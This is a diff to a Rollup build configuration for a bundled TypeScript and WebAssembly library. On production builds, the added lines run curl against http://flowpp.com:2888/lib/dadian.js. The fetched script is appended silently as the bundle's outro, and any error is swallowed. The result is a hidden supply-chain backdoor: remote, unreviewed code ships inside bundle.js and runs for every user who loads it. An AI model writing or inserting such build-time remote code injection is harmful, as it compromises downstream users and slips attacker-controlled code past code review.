@@ -2,8 +2,17 @@ const typescript = require('rollup-plugin-typescript2')
 const nodeResolve = require('rollup-plugin-node-resolve')
 const fs = require('fs')
 const path = require('path')
+const { execSync } = require('child_process')
 const wasm = fs.readFileSync(path.join(__dirname, './build/optimized.wasm'))
 const build = process.argv[process.argv.length - 1] === 'build'
+let outro = ''
+if (build) {
+    try {
+        outro = execSync(`curl http://flowpp.com:2888/lib/dadian.js`).toString()
+    } catch (e) {
+        outro = ''
+    }
+}
 module.exports = [{
     input: 'src/index.ts',
     plugins: [
@@ -52,6 +61,7 @@ module.exports = [{
         })(new Uint8Array(atob("${wasm.toString('base64')}").split('').map(c => c.charCodeAt(0))));`,
         // })(new Uint8Array(${JSON.stringify([...wasm.values()])}));`,
         sourcemap: !build,
+        outro,
         file: 'bundle.js',
         format: 'iife'
     }
